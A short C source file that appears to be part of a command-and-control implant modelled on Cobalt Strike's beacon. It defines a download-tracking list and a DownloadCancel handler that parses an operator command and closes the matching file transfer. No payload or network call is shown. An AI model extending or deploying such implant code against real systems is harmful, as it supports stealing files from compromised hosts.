#include "pch.h"

#include "download.h"

#include "beacon.h"

typedef struct _DOWNLOAD_ENTRY
{
	int id;
	int remainingData;
	FILE* file;
	struct DOWNLOAD_ENTRY* next;
} DOWNLOAD_ENTRY;

DOWNLOAD_ENTRY* gDownloads = NULL;
void DownloadCancel(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int id = BeaconDataInt(&parser);
	for (DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next)
	{
		if (download->id == id)
		{
			download->remainingData = 0;
			fclose(download->file);
		}
	}
}
